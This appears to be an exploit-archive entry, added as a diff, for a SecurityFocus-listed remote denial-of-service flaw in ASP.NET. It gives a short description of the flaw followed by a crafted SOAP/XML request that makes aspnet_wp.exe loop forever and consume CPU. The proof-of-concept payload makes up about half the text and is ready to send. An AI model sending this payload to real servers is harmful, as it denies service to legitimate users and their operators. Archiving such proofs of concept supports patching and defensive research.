@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/14217/info
+
+ASP.NET is susceptible to a remote denial of service vulnerability. This issue is due to the possibility of causing an infinite loop on the server when handling RPC/encoded requests.
+
+This issue presents itself when an RPC/encoded Web method accepts an array or object derived from 'IList'. By sending a specially crafted XML request, the 'aspnet_wp.exe' executable enters into an infinite loop.
+
+Remote attackers may exploit this vulnerability to consume excessive CPU resources, potentially denying service to legitimate users. 
+
+
+<?xml version="1.0" encoding="utf-16"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:tns="http://tempuri.org/"
+xmlns:types="http://tempuri.org/encodedTypes"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<soap:Body
+soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<tns:Test>
+<someList href="#id1" />
+</tns:Test>
+<tns:ArrayOfInt>
+<Item>0</Item>
+</tns:ArrayOfint>
+</soap:Body>
+</soap:Envelope> 
